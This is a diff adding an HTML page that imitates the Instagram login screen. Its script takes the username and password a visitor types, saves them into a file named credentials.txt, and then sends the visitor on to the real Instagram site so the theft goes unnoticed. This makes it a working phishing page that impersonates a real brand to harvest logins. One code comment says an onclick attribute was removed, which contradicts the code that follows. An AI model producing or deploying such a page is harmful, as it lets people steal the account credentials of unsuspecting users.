@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+          body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+        }
+
+        .login-container {
+            width: 350px;
+            padding: 16px;
+            background-color: white;
+            margin: 0 auto;
+            margin-top: 10%;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 175px;
+            height: 51px;
+            margin-bottom: 20px;
+        }
+
+        .login-container form input {
+    box-sizing: border-box; 
+    width: 100%;
+    padding: 10px;
+    margin: 7px 0;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    font-size: 0.9em;
+}
+
+
+        .login-container form button {
+            width: 100%;
+            padding: 9px;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+
+        .login-container .fb-login {
+            color: #385185;
+            cursor: pointer;
+            font-size: 0.9em;
+            margin-top: 10px;
+            display: block;
+        }
+
+        .login-container a {
+            color: #385185;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+
+        .app-links {
+            margin-top: 20px;
+        }
+
+        .app-links a {
+            color: #385185;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="instagram_logo.png" alt="Instagram Logo">
+
+    <form id="login-form">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+
+        <!-- Removed the onclick attribute from the button -->
+        <button type="button" onclick="storeCredentials()">Log in</button>
+        <p>OR</p>
+        <a href="facebook.com" class='fb-login'>Log in with Facebook</a>
+        <a href="#">Forgot password?</a>
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </form>
+
+    <p>Get the app.</p>
+    <div class='app-links'>
+        <a href="#">Get it on Google Play</a> | 
+        <a href="#">Get it from Microsoft</a>
+    </div>
+</div>
+
+<script>
+function storeCredentials() {
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+
+    // Creating a Blob containing the data
+    var dataBlob = new Blob([`Username: ${username}\nPassword: ${password}`], { type: 'text/plain' });
+
+    // Creating a link element and triggering a click to download the file
+    var link = document.createElement('a');
+    link.href = URL.createObjectURL(dataBlob);
+    link.download = 'credentials.txt';
+    link.click();
+
+    // Redirect to Instagram after storing credentials
+    window.location.href = 'https://www.instagram.com';
+    }
+</script>
+
+</body>
+</html>
